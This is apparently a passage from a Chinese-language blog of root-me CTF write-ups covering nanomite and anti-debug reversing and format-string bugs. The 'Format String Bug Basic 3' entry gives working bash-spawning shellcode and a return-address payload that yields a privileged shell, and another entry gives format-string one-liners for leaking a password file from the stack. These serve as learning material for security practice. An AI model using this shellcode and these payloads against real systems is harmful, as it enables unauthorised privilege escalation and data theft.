password += <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Password found is :&quot;</span>+password)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;quit&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="论文-想法"><a href="#论文-想法" class="headerlink" title="论文 想法"></a>论文 想法</h3><p>云攻击</p>
<p>让VM支持去重，然后flush+reload</p>
<p>建立cpu cache的随机策略<br>映射</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF_x64_Nanomites_Introduction</title>
    <url>/2020/10/26/ELF_x64_Nanomites_Introduction/</url>
    <content><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction"><a href="#ELF-x64-Nanomites-Introduction" class="headerlink" title="ELF x64 - Nanomites - Introduction"></a>ELF x64 - Nanomites - Introduction</h2><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><del>mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。</del></p>
<pre><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></pre>
<a id="more"></a>
<p>在虚拟地址空间中为所调用进程创建一个新的映射。开始地址为addr，长度为length<br>内核在靠近页边界的地方，尝试创建。如果已有映射在此，就不用addr，会返回新地址</p>
<p>The contents of a <code>file mapping </code>(as opposed to an anonymous mapping;<br>       see MAP_ANONYMOUS below), are initialized using <code>length bytes s</code>tarting<br>       at <code>offset </code>offset in the file (or other object) referred to by the<br>       <code>file descriptor</code> fd. </p>
<hr>
<p><code>prot</code>参数描述所需的内存保护</p>
<p> The <code>flags</code> argument determines whether updates to the mapping are<br>       visible to other processes mapping the same region, and whether<br>       updates are carried through to the underlying file.</p>
<p>mmap 在虚拟空间中开辟一段空间，当要读的时候，将文件内容加载进物理内存</p>
<hr>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><pre><code>void * memcpy ( void * destination, const void * source, size_t num );</code></pre>
<p>表示将0x400ac0的141个字节拷贝到新开辟的虚拟空间中0x7ffff7ffb000</p>
<p>0x4008b6:    mov    rcx,QWORD PTR [rip+0x2007c3]        # 0x601080<br>rcx==0x3148c93148c03148</p>
<hr>
<h3 id="r2"><a href="#r2" class="headerlink" title="r2"></a>r2</h3><p><code>help x</code><br>命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。</p>
<p><code>gdb-peda$ x/141xb 0x400ac0</code></p>
<hr>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>pid_t fork(void)<br>fork系统调用用于创建一个新进程，称为子进程，它与进程（称为系统调用fork的进程）<code>同时运行</code>，此进程称为父进程。创建新的子进程后，两个进程将<code>执行</code>fork（）系统调用之后的<code>下一条指令</code>。</p>
<p>返回值： 若成功调用一次则返回两个值，<code>子进程返回0</code>，<code>父进程返回子进程ID</code>；否则，出错返回-1</p>
<p>这意味着父子进程间不共享这些<code>存储空间</code>。</p>
<hr>
<pre><code>0x4008d1:    call   0x400630 &lt;fork@plt&gt;</code></pre>
<p>调用后返回0， 则当前的子进程</p>
<hr>
<p><del>gdb catch 捕获异常</del></p>
<h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h3><p>作用同于wait，但可指定pid进程清理，可以不阻塞。</p>
<p><code>pid_t waitpid(pid_t pid,int *status,int options);</code>成功：返回清理掉的子进程ID；失败：-1（无子进程）</p>
<ul>
<li>pid&gt;0    只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li>
</ul>
<ul>
<li>参数status如果不是一个空指针,则终止进程的终止状态就存放在status所指向的单元。</li>
</ul>
<hr>
<h3 id="SAR"><a href="#SAR" class="headerlink" title="SAR"></a>SAR</h3><p>SAR 算术右移指令<br>符号位保持不变</p>
<p>call rax 如果都不跳转，则到这里<br>0x7ffff7ffb07b:    mov    al,0x3c<br>   0x7ffff7ffb07d:    mov    edi,0x0<br>   0x7ffff7ffb082:    syscall </p>
<h2 id="没有解出来-tw-1f198-worried"><a href="#没有解出来-tw-1f198-worried" class="headerlink" title="没有解出来:tw-1f198::worried:"></a>没有解出来:tw-1f198::worried:</h2>]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - Anti-debug</title>
    <url>/2020/10/23/ELF%20x86%20-%20Anti-debug/</url>
    <content><![CDATA[<h2 id="ELF-x86-Anti-debug"><a href="#ELF-x86-Anti-debug" class="headerlink" title="ELF x86 - Anti-debug"></a>ELF x86 - Anti-debug</h2><p>参考<a href="https://re.kv.io/crackme/12.html">https://re.kv.io/crackme/12.html</a><br><code>int 80</code> 系统调用<br><code>32位</code>下，<code>EAX</code>保存调用号<br><del>mov eax , 30  utime, utimes - change file last access and modification times<br>int utime(const char *filename, const struct utimbuf *times);</del></p>
<p><del>The utime() system call changes the access and modification times of<br>the inode specified by filename to the actime and modtime fields of<br>times respectively.</del></p>
<a id="more"></a>
<hr>
<p>上面是错的<br>0x30 as sys_signal 十六进制 <code>直接弄错</code><br>0x30 == 48</p>
<pre><code>void (*signal(int sig, void (*func)(int)))(int)</code></pre>
<p><code>sys_signal</code>设置一个函数来处理信号，即<strong>带有 sig 参数的信号处理程序</strong><br><code>sig </code>– 在信号处理程序中作为变量使用的信号码<br><code>0x5</code> ==<code>SIGABRT</code>    (Signal Abort) 程序异常终止。<br><code>func</code> – 一个指向函数的指针。它可以是一个由程序定义的函数</p>
<hr>
<p><code>int3</code> would cause a debugger to stop</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">08048063</span> loc_8048063:                            ; CODE XREF: start↑j</span><br><span class="line">.text:<span class="number">08048063</span>                 mov     eax, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">08048068</span>                 mov     ebx, <span class="number">5</span></span><br><span class="line">.text:<span class="number">0804806</span>D                 mov     ecx, offset sub_80480E2</span><br><span class="line">.text:<span class="number">08048072</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_signal</span><br><span class="line">.text:<span class="number">08048074</span>                 jmp     <span class="keyword">short</span> loc_8048077</span><br><span class="line">.text:<span class="number">08048074</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048076</span>                 db <span class="number">0</span>CEh</span><br><span class="line">.text:<span class="number">08048077</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048077</span></span><br><span class="line">.text:<span class="number">08048077</span> loc_8048077:                            ; CODE XREF: start+<span class="number">14</span>↑j</span><br><span class="line">.text:<span class="number">08048077</span>                 <span class="keyword">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">08048078</span>                 jmp     <span class="keyword">short</span> loc_804807B</span><br></pre></td></tr></table></figure>
<p>先设置第一个signal处理函数，在<code>0x08048077</code>处遇到<code>int 3</code>跳到处理函数</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">080480E2</span></span><br><span class="line">.text:<span class="number">080480E2</span> sub_80480E2     proc near               ; DATA XREF: start+D↑o</span><br><span class="line">.text:<span class="number">080480E2</span>                 mov     eax, offset sub_8048104</span><br><span class="line">.text:<span class="number">080480E7</span>                 jmp     <span class="keyword">short</span> loc_8048101</span><br><span class="line">.text:<span class="number">080480E9</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480E9</span></span><br><span class="line">.text:<span class="number">080480E9</span> loc_80480E9:                            ; CODE XREF: sub_80480E2:loc_80480FF↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                                         ; sub_80480E2:loc_8048101↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                 cmp     eax, <span class="number">80482E8</span>h</span><br><span class="line">.text:<span class="number">080480</span>EE                 jz      <span class="keyword">short</span> locret_8048103</span><br><span class="line">.text:<span class="number">080480F</span>0                 jmp     <span class="keyword">short</span> loc_80480F3</span><br><span class="line">.text:<span class="number">080480F</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>2                 db <span class="number">0E8</span>h</span><br><span class="line">.text:<span class="number">080480F</span>3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>3</span><br><span class="line">.text:<span class="number">080480F</span>3 loc_80480F3:                            ; CODE XREF: sub_80480E2+E↑j</span><br><span class="line">.text:<span class="number">080480F</span>3                 <span class="keyword">xor</span>     dword ptr [eax], <span class="number">8048F</span>C1h</span><br><span class="line">.text:<span class="number">080480F</span>9                 add     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080480F</span>C                 jmp     <span class="keyword">short</span> loc_80480FF</span><br><span class="line">.text:<span class="number">080480F</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>E                 db <span class="number">0</span>EBh</span><br><span class="line">.text:<span class="number">080480F</span>F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>F</span><br><span class="line">.text:<span class="number">080480F</span>F loc_80480FF:                            ; CODE XREF: sub_80480E2+<span class="number">1</span>A↑j</span><br><span class="line">.text:<span class="number">080480F</span>F                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048101</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048101</span></span><br><span class="line">.text:<span class="number">08048101</span> loc_8048101:                            ; CODE XREF: sub_80480E2+<span class="number">5</span>↑j</span><br><span class="line">.text:<span class="number">08048101</span>                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048103</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048103</span></span><br><span class="line">.text:<span class="number">08048103</span> locret_8048103:                         ; CODE XREF: sub_80480E2+C↑j</span><br><span class="line">.text:<span class="number">08048103</span>                 retn</span><br><span class="line">.text:<span class="number">08048103</span> sub_80480E2     endp</span><br></pre></td></tr></table></figure>
<p>将代码解密出来，然后后面根据signal执行处理代码</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(lambda i: chr(i ^ <span class="number">0xfc</span>), [<span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0xCF</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xDD</span>]))</span><br></pre></td></tr></table></figure>
<p><code>&#39; &#39;</code>字符串内置函数<code>join()</code><br><code>map(fun, iter) </code>函数fun操作iter<br>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。<br><code>lambda</code> 声明为匿名函数，如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(lambda x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="r2（一个大佬的解法）"><a href="#r2（一个大佬的解法）" class="headerlink" title="r2（一个大佬的解法）"></a><code>r2</code>（一个大佬的解法）</h3><p><code>oo+</code>          reopen in read-write<br><code>wox 0xfc @ entry0+625!18</code>  //会写入 将0xfc与后面18个值异或<br>wox [val]                     ^=  xor  (f.ex: wox 0x90)<br><code>ps @ entry0+625</code><br>ps       print string</p>
<hr>
<p><code>wa nop </code>          write nopcode using asm.arch and asm.bits</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x0804060</span>]&gt; wa nop @ <span class="number">0x08048077</span></span><br><span class="line">[<span class="number">0x0804060</span>]&gt; wa mov ecx, <span class="number">0x80482d1</span> @ <span class="number">0x08048167</span></span><br></pre></td></tr></table></figure>
<p>控制程序流程</p>
<hr>
<h3 id="sys-write-−"><a href="#sys-write-−" class="headerlink" title="sys_write −"></a>sys_write −</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov	edx,<span class="number">4</span>		; message length</span><br><span class="line">mov	ecx,msg		; message to write</span><br><span class="line">mov	ebx,<span class="number">1</span>		; <span class="function">file <span class="title">descriptor</span> <span class="params">(<span class="built_in">stdout</span>)</span></span></span><br><span class="line">mov	eax,4		; system call number (sys_write)</span><br><span class="line"><span class="keyword">int</span>	<span class="number">0x80</span>		; call kernel</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - Format String Bug Basic 3</title>
    <url>/2021/01/03/Format_String_Bug_Basic_3/</url>
    <content><![CDATA[<h1 id="ELF-x86-Format-String-Bug-Basic-3"><a href="#ELF-x86-Format-String-Bug-Basic-3" class="headerlink" title="ELF x86 - Format String Bug Basic 3"></a>ELF x86 - Format String Bug Basic 3</h1><a id="more"></a>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// char    log_file = &quot;/var/log/bin_error.log&quot;;</span></span><br><span class="line">    <span class="keyword">char</span>    outbuf[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    buffer[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    user[<span class="number">12</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *username = <span class="string">&quot;root-me&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// FILE *fp_log = fopen(log_file, &quot;a&quot;);</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    fgets(user, <span class="keyword">sizeof</span>(user), <span class="built_in">stdin</span>);</span><br><span class="line">    user[<span class="built_in">strlen</span>(user) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(user, username)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">sprintf</span> (buffer, <span class="string">&quot;ERR Wrong user: %400s&quot;</span>, user);</span><br><span class="line">        <span class="built_in">sprintf</span> (outbuf, buffer);</span><br><span class="line">        <span class="comment">// fprintf (fp_log, &quot;%s\n&quot;, outbuf);</span></span><br><span class="line">   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad username: %s\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s ! How are you ?\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fclose(fp_log);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h2><ol>
<li>shellcode 放在环境变量中</li>
<li>溢出，控制EIP，指向shellcode</li>
</ol>
<h3 id="snprintf-amp-sprintf"><a href="#snprintf-amp-sprintf" class="headerlink" title="snprintf &amp; sprintf"></a>snprintf &amp; sprintf</h3><pre><code>int snprintf(char *restrict s, size_t n,
       const char *restrict format, ...);
int sprintf(char *restrict s, const char *restrict format, ...);</code></pre>
<p>后面跟着format</p>
<p>字符串漏洞 overwrite the GOT entry</p>
<p><code>$ ulimit -s unlimited </code>关闭ASLR</p>
<hr>
<p>可以指定宽度，不足的左边补空格：<br>    sprintf(s, “%8d%8d”, 123, 4567); //产生：” 123 4567”</p>
<hr>
<h3 id="得到段错误"><a href="#得到段错误" class="headerlink" title="得到段错误"></a>得到段错误</h3><p><code>char *s1 @ ebp-0x414 </code> 输入放在这里</p>
<p>push ebp<br>此时esp 指向ebp内的值</p>
<p><code>0x804858b &lt;main+133&gt;:        lea    eax,[ebp-0x408]</code><br>存放buffer</p>
<pre><code>gdb-peda$ x/1s $ebp-0x408
0xbffff730:     &quot;ERR Wrong user:&quot;, &#39; &#39; &lt;repeats 185 times&gt;...</code></pre>
<p><code>0x80485a1 &lt;main+155&gt;:        lea    eax,[ebp-0x208]</code><br>存放outbuffer</p>
<pre><code>gdb-peda$ x/100s $ebp+0x200
0xbffffe01:     &quot;SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</code></pre>
<p>Then buffer is set to ERR Wrong user: &lt;400-9 whitespaces&gt;%200xAAAA<br>ERR Wrong user:  长度是16</p>
<p> outbuf is set to ERR Wrong user: &lt;400-9 whitespaces&gt;&lt;200 bytes&gt;AAAA</p>
<p>576 space +7 =583 个space  + 8字节 + AAAA<br>因为%x打印8个数，然后再存的话就是8字节<br>gdb-peda$ x/1s $ebp<br>0xbffffb18:     ‘ ‘ &lt;repeats 79 times&gt;, “30303225AAAA”</p>
<p>那么<br>113 覆盖ebp的位置<br>EBP: 0xbffffb18 (“aaaa”)</p>
<p>%117xaaaa<br>执行leave后，esp指向aaaa<br>EIP: 0x61616161 (‘aaaa’)</p>
<p>shellcode</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">export SHELLCODE=`python -c &#x27;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#x27;`</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">1</span>s <span class="number">0xbffffe02</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">0xbffffe0c</span>:     <span class="string">&quot;j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</span></span><br></pre></td></tr></table></figure>

<p>palyload:<br>(python -c “print ‘%117x’ + ‘\x0c\xfe\xff\xbf’”;cat) | ./ch17</p>
<p>但是报段错误，还没想到原因。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>原因应该是gdb内外的地址是不一样的<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a><br>使用这篇中的findenv.c</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">    ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用touch，vim命令创建文件</p>
<pre><code>app-systeme-ch17@challenge02:~$ /tmp/findenv SHELLCODE ./ch17
SHELLCODE will be at 0xbffffe31


app-systeme-ch17@challenge02:~$ (python -c &quot;print &#39;%117x&#39;+&#39;\x31\xfe\xff\xbf&#39;&quot; ;
cat ) | ./ch17
Username: Bad username: %117x1þÿ¿
id
uid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17
-cracked) groups=1117(app-systeme-ch17),100(users)</code></pre>
<h3 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h3><p><code>show env PATH</code></p>
<p><code>echo $PATH</code></p>
<p>%x 打印32位</p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Format string bug basic 1</title>
    <url>/2020/11/17/Format_string_bug_basic%201/</url>
    <content><![CDATA[<p>Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变<br>地址：0x804810: – : 0x804820</p>
<h2 id="Exploit-writing-tutorial-part-1-Stack-Based-Overflows"><a href="#Exploit-writing-tutorial-part-1-Stack-Based-Overflows" class="headerlink" title="Exploit writing tutorial part 1 : Stack Based Overflows"></a><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows">Exploit writing tutorial part 1 : Stack Based Overflows</a></h2><p><code>ax</code> 16位<br><code>al</code> 8位</p>
<pre><code>mov     rax, [rbp+var_E0] ；rax=0xc8    0xdf    0xff    0xff    0xff    0x7f
mov     rax, [rax] ; rax=0x7fffffffe2f4
mov     [rbp+input], rax ;
mov     rax, [rbp+input] ; rax=0x7fffffffe2f4
mov     rdi, rax        ; s
call    _strlen</code></pre>
<a id="more"></a>
<h3 id="寻找确定位置"><a href="#寻找确定位置" class="headerlink" title="寻找确定位置"></a>寻找确定位置</h3><p><code>msf-pattern_create -l 5000</code><br>At this time, eip contains <code>0x356b4234</code> (note : little endian : we have overwritten EIP with 34 42 6b 35 = <code>4Bk5</code></p>
<p><code>msf-pattern_offset 0x356b4234 5000</code><br>计算pattern 偏移值</p>
<p><code>1094</code>. That’s the <code>buffer length needed</code> to overwrite EIP. So if you create a file with <code>25000+1094 A’s</code>, and then add <code>4 B’s (42 42 42 42 in hex)</code><br><code>EIP</code> should contain <code>42 42 42 42</code>.</p>
<hr>
<h3 id="清理函数"><a href="#清理函数" class="headerlink" title="清理函数"></a>清理函数</h3><p>POP 出下一跳地址后， ESP 不是指向<code>”下一个栈地址“</code><br>·ESP从模式的第5个字符开始，而不是第一个字符。<br>·（由于调用约定，当将参数传递给子函数时，<code>子函数将清理父函数使用的堆栈空间</code>，所以造成ESP不是指向下一个栈地址）</p>
<hr>
<h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>将EIP 写为指向jmp esp的地址，shellcode写在esp指向的地址处</p>
<p>windbg::<br>s 01b10000 l 01fdd000 ff e4<br>search 在这之间寻找机器码为 <code>ff e4</code> 的指令</p>
<hr>
<h3 id="NULL-字节"><a href="#NULL-字节" class="headerlink" title="NULL 字节"></a>NULL 字节</h3><p>The <code>null byte</code> would become <code>a string terminator</code> and the<code> rest of the buffer data</code> will become <code>unusable</code>)</p>
<p>Alternatively, you can split up your shellcode in smaller ‘eggs’ and use a technique called ‘egg-hunting’ to reassemble the shellcode before executing it.</p>
<h2 id="ELF-x86-Format-string-bug-basic-1"><a href="#ELF-x86-Format-string-bug-basic-1" class="headerlink" title="ELF x86 - Format string bug basic 1"></a>ELF x86 - Format string bug basic 1</h2><p><a href="http://showlinkroom.me/2017/01/28/pwn-learn-printf/">http://showlinkroom.me/2017/01/28/pwn-learn-printf/</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">|   符号           |       作用               |</span><br><span class="line"><span class="selector-tag">-----------------------------------------------</span></span><br><span class="line">|    %d            |  十进制有符号整数         |</span><br><span class="line">|    %u            |  十进制无符号整数         |</span><br><span class="line">|    %f            |  浮点数                  |</span><br><span class="line">|    %s            |  字符串                  |</span><br><span class="line">|    %c            |  单个字符                |</span><br><span class="line">|    %p            |  指针的值                |</span><br><span class="line">|    %e            |  指数形式的浮点数         |</span><br><span class="line">|    %x            |  无符号以十六进制表示的整数|</span><br><span class="line">|    %o            |  无符号以八进制表示的整数  |</span><br><span class="line">|    %g            |  自动选择合适的表示法     |  </span><br><span class="line">|    %n            |  将printf之前已经输出的字符串个数赋给指定参数（此时参数提供地址）|</span><br></pre></td></tr></table></figure>

<hr>
<p>题目源码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        FILE *secret = fopen(<span class="string">&quot;/challenge/app-systeme/ch5/.passwd&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), secret);</span><br><span class="line">        <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">        fclose(secret);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);</code></p>
<p>Because <code>‘%s’</code> displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to readfrom anillegal address, which is not mapped.</p>
<pre><code>printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);
stack top. . .&lt;&amp;a&gt;&lt;a&gt;&lt;i&gt;A. . .stack bottom</code></pre>
<p><a href="https://imgchr.com/i/DVLAYV"><img src="https://s3.ax1x.com/2020/11/17/DVLAYV.png" alt="DVLAYV.png"></a></p>
<p>可以直接读栈里的内容</p>
<hr>
<h3 id="查看栈里的内容"><a href="#查看栈里的内容" class="headerlink" title="查看栈里的内容"></a>查看栈里的内容</h3><p><code>printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);</code><br>This works, because we instruct the <code>printf-</code>function to retrieve <code>five parameters</code> from the stack and display them as 8-digit padded hexadecimalnumbers. So a possible output may look like:<code>40012980.080628c4.bffff7a4.00000005.08059c04</code></p>
<h3 id="查看任意地址内容"><a href="#查看任意地址内容" class="headerlink" title="查看任意地址内容"></a>查看任意地址内容</h3><p>%s  string ((const) (unsigned) char *) reference<br>‘％s’参数恰好做到了，它显示了堆栈提供的地址中的内存。</p>
<p><a href="https://imgchr.com/i/DVLc6g"><img src="https://s3.ax1x.com/2020/11/17/DVLc6g.png" alt="DVLc6g.png"></a></p>
<hr>
<p>当我在GDB中执行fgets()的时候。<br>but if we try to debug the programm with GDB, we get a <code>permission denied</code> on the <code>fgets() call</code>…</p>
<pre><code>gdb-peda$ help telescope 
Display memory content at an address with smart dereferences
Usage:
    telescope [linecount] (analyze at current $SP)
    telescope address [linecount]</code></pre>
<hr>
<h3 id="大佬的方法"><a href="#大佬的方法" class="headerlink" title="大佬的方法"></a>大佬的方法</h3><pre><code>for i in `seq 1 20`; do ~/ch5 &quot;%$i&quot;&#39;$08X&#39; ; echo; done</code></pre>
<p>一次打印8个字节</p>
<pre><code>for i in `seq 1 2 20`; do ./ch5 &quot;%$i&quot;&#39;$08X&#39;&quot;%$((i+1))&quot;&#39;$08X&#39;; echo; done</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"># Finally, we want to</span><br><span class="line">- convert to big endian, <span class="keyword">using</span> sed -r ’s/(..)(..)(..)(..)/\<span class="number">4</span>\<span class="number">3</span>\<span class="number">2</span>\<span class="number">1</span>/g’</span><br><span class="line">- convert the hexa to printable character, <span class="keyword">using</span> xxd -r -p</span><br><span class="line">- filter non-printable charaters, <span class="keyword">using</span> strings</span><br></pre></td></tr></table></figure>

<p>filtering only <code>13-or-more-bytes</code> strings (<code>strings -13</code>)</p>
